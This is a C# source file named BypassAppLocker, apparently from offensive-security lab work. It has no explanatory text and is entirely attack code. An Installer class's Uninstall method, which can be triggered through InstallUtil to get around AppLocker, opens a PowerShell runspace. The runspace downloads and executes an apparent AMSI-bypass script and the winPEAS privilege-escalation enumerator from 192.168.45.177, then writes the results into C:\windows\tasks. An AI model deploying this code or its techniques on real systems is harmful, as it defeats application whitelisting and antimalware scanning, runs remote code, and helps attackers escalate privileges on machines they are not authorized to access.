using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace BypassAppLocker
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Running.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd1 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177:445/amsi.txt') | IEX;";
            String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.177:445/winPEAS.ps1') | IEX;Invoke-winPEAS Invoke-AllChecks | Out-File -FilePath C:\\windows\\tasks\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            Console.WriteLine("Test1");

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd1);
            try
            {
                ps.Invoke();
            }
            catch (Exception e)
            {
                Console.WriteLine("{0} Exception caught.", e);
            }
            ps.AddScript(cmd2);
            try
            {
                ps.Invoke();
            }
            catch (Exception e)
            {
                Console.WriteLine("{0} Exception caught.", e);
            }
            rs.Close();
        }
    }
}
